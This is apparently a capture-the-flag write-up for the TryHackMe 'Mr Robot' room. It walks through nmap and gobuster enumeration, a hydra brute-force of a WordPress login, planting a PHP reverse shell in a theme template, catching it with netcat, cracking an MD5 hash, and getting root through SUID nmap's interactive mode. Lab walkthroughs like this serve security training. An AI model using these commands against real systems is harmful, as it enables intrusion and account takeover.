# [Mr Robot CTF [medium]](https://tryhackme.com/room/mrrobot)

# Enum

## nmap
```
>>> nmap -sC -sV 10.10.164.16               
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-06 14:23 CET
Nmap scan report for 10.10.164.16
Host is up (0.047s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```

## port 80

When we access the website, we encounter an animation depicting the boot process of a Linux machine, followed by entering at this text interface:

![alt text](https://i.imgur.com/srqwL0u.png)

Running the different commands we can see videos or text and images talking about the mister robot series.

## dir enum
```
>>> gobuster  -u http://10.10.164.16/  -w wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html,html

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.164.16/
[+] Threads      : 10
[+] Wordlist     : wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2024/02/06 14:30:44 Starting gobuster
=====================================================
/.git/index.php (Status: 301)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/0 (Status: 301)
/Image (Status: 301)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/cgi-bin/.html (Status: 403)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/images (Status: 301)
/image (Status: 301)
/index.php (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/license (Status: 200)
/login (Status: 302)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/rdf (Status: 301)
/readme (Status: 200)
/readme.html (Status: 200)
/render/https://www.google.com (Status: 301)
/render/https://www.google.com.php (Status: 301)
/render/https://www.google.com.html (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-app.php (Status: 403)
/wp-atom.php (Status: 301)
/wp-config (Status: 200)
/wp-config.php (Status: 200)
/wp-commentsrss2.php (Status: 301)
/wp-content (Status: 301)
/wp-cron (Status: 200)
/wp-cron.php (Status: 200)
/wp-feed.php (Status: 301)
/wp-includes (Status: 301)
/wp-links-opml (Status: 200)
/wp-links-opml.php (Status: 200)
/wp-load (Status: 200)
/wp-load.php (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/wp-rdf.php (Status: 301)
/wp-register.php (Status: 301)
/wp-rss.php (Status: 301)
/wp-rss2.php (Status: 301)
/wp-signup (Status: 302)
/wp-signup.php (Status: 302)
=====================================================
2024/02/06 14:36:03 Finished
=====================================================
```

Looking at `http://IP/robots` we can find two interesting files:

```
fsocity.dic
key-1-of-3.txt <- the first flag
```

Knowing it is a wordpress, we are going to try to bruteforce the creds with the `fsocity.dic` wordlist at `http://IP/wp-login.php`.

```
>>> hydra -l Elliot -P fsocity.dic 10.10.164.16  http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-06 14:52:17
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
[DATA] attacking http-post-form://10.10.164.16:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302
[STATUS] 712.00 tries/min, 712 tries in 00:01h, 857523 to do in 20:05h, 16 active
[STATUS] 572.33 tries/min, 1717 tries in 00:03h, 856518 to do in 24:57h, 16 active
[80][http-post-form] host: 10.10.164.16   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-06 14:57:44
```

![alt text](https://i.imgur.com/zcezbtU.png)

# Initial access

Now that we have access to the pannel, we will upload our reverse shell.
We will edit the apparence of and put this [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Go to appearance then editor and replace the 404 Template with the reverse shell.
![alt text](https://i.imgur.com/d1kc9er.png)

Once you uploaded the reverse shell go to a page that don't exist like `IP/ananas` for example and boom we have a reverse shell :)

```sh
>>> nc -lvnp 1235             
Listening on 0.0.0.0 1235
Connection received on 10.10.164.16 45444
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 14:05:19 up 56 min,  0 users,  load average: 0.00, 0.71, 1.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ 
```

Looking at `/home/robot` we can see two files:
```sh
daemon@linux:/home/robot$ ls
key-2-of-3.txt	password.raw-md5
```
looking at password.raw-md5 we have a username and a password: `robot:c3fcd3d76192e4007dfb496cca67e13b`
looking [crackstation.net](https://crackstation.net/) we can get the password:

![alt text](https://i.imgur.com/LVm9fnA.png)

let's connect to the robot user:
```sh
$ su robot
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/bash")' #spawn a bash shell
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 
```

# PrivEsc

looking at the suid files we can see that nmap is owned by root:
```sh
robot@linux:/$ find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
```

looking at [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) we can see that we can spawn a shell simply running:
```sh
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# ls /root
ls /root
firstboot_done	key-3-of-3.txt #the last flag
```
